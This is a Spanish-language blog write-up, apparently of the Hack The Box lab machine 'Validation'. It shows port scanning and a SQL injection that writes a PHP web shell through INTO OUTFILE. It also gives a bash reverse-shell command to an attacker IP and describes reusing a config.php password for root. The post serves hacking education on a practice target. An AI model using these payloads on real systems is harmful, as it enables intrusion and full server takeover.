---
title:  "Writeup de la máquina Validation de Hack The Box"
mathjax: true
layout: post
categories: writeup
tags: sql-injection burpsuite php web-shell burpsuite
---

# Resolución de la máquina Validation de la plataforma de HackTheBox

![](https://i.ibb.co/SdzyZRf/validation.png)

### 💉 *"Máquina vulenrable a SQL Injection !!"*

**Como siempre, primero revisamos que tenemos conexión con la máquina víctima, desde nuestra máquina atacante. Una forma de hacerlo es a través del envío de paquetes ICMP con el comando "ping"**:

```bash
ping -c 1 10.10.11.116
```

**Ahora sabemos que tenemos conexión con la máquina ya que nos respondió con los paquetes que recibimos**

![](https://i.ibb.co/tMw3TDP/ping.png)

**Primeramente hacemos un escaneo Activo de la máquina en búsqueda de puertos abiertos con el siguiente comando:**

```bash
sudo nmap 10.10.11.116 -p- --min-rate 5000 -sS -Pn -oG openPorts -vvv 
```

Con el comando anterior exportamos el resultado en un formato en el cual podamos extraer los puertos abiertos con la ayuda de comandos como *"grep, awk y otros más"* para luego escanear en profundidad:

```bash
sudo nmap 10.10.11.116 -p22,80,4566,8080 -sV -sC -sS -Pn -oN scanComplete -vvv
```

#### Ahora con el escaneo completo obtenemos el siguiente resultado:

![](https://i.ibb.co/HX2nbYG/nmap.png)

**Como está abierto el puerto 80 corriendo el servicio http, entramos en el navegador web en la dirección IP de la máquina por ese puerto:**

*Pero antes de seguir con el pentesting de esta máquina, agregamos como host "validation.htb" con la IP de la máquina (10.10.11.116)*

![](https://i.ibb.co/ZMB5KXJ/etc-hosts.png)

**Vemos que tenemos un formulario simple, escrito en HTML con un input que nos permite elegir nuestro "Username", además de la región, que viene por defecto "Brazil". Si inspeccionamos el código fuente podemos ver que el <form> es decir, el formulario, envía los valores del "Username" y la "Región" al servidor web. Con esto podemos pensar que estos valores se alojan en una Base de Datos:**

![](https://i.ibb.co/nBv2wxC/form-html.png)

## Burp Suite

**Ahora configuramos la extensión de FoxyProxy en Firefox para redirigir la solicitud (o Request) a través de nuestro localhost por el puerto 8080 (127.0.0.1:8080). De este modo lo interceptamos con Burp Suite y desde ahí seguir:**

![](https://i.ibb.co/rdCRMvK/burp-suite.png)

**Ahora desde Burp Suite, comentamos el valor de el campo "country" y le inyectamos el código:**

```
or 1=1
```

![](https://i.ibb.co/h1gK15v/sqli-nourl.png)

Luego lo encodeamos con codificación URL:

![](https://i.ibb.co/crrD0TR/sqli-url.png)

**Ahora si regresamos a la parte web, vemos que se filtra el Error del Backend, lo cual nos hace pensar que es vulnerable a SQL Injection:**

![](https://i.ibb.co/xFDK3xZ/sqli-vulnerable.png)

## Una vez encontrada la vulnerabilidad, pasamos a crear un Backdoor

Como vemos en el sitio, la aplicación web utiliza PHP. Podemos intentar inyectarle una web-shell en PHP a través de un ataque de SQL Injection:

*El código que vamos a usar para agregar una web-shell con una SQL Injection será:*

```sql
' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'-- -
```

*Con el código anterior le decimos al servidor que también seleccione esa fracción de código, (que es el Backdoor), y lo inserte en el archivo /var/www/html/shell.php. Es decir que shell.php será nuestra web-shell en PHP. También es bueno saber que normalmente los servidores web que se ejecutan en Linux (estos son la mayoría actualmente, aunque no todos), tienen como raíz de directorios web la ruta /var/www/html*

![](https://i.ibb.co/M8HJL2d/backdoor.png)

## Ahora probamos y ¡Funciona!

**Tenemos lista nuestra web-shell en la ruta /shell.php, ahora para ejecutar un comando en el servidor solamente hay que añadir la siguiente query (consulta):**

```
shell.php?cmd={comando}
```

![](https://i.ibb.co/3Nc8csP/web-shell.png)

Ahora vamos a [https://www.revshells.com/](https://www.revshells.com/) y generamos un payload para ejecutar una Shell Reversa con Netcat y poder conectarnos al servidor desde una consola interactiva. El mismo lo ejecutamos como comando en el Backdoor de "shell.php".

Luego de probar con varios tipos de shells, me funcionó agregarle:

```bash
bash -c '{payload de la shell}'
```

Lo cual quedaría así:

```bash
bash -c 'bash -i >& /dev/tcp/10.10.14.2/4545 0>&1'
```

Lo encodeamos como URL y ejecutamos el código en la web-shell, desde el navegador o desde Burp Suite.

**Vemos en el archivo "config.php" una contraseña.**

![](https://i.ibb.co/hZfGLGh/config-php.png)

**Como somos Pentesters, tenemos que probar todas las formas en que se podría acceder de forma privilegiada al sistema, así que intentamos usar esa contraseña para autenticarnos como usuario root:**

## ¡YES! Al parecer la contraseña de root es esa.

![](https://i.ibb.co/NsT0Z4n/flag-root.png)

### Y con esto terminamos la máquina y tenemos acceso total al sistema.

Happy Hacking!!

----

## Author: Mateo Fumis 
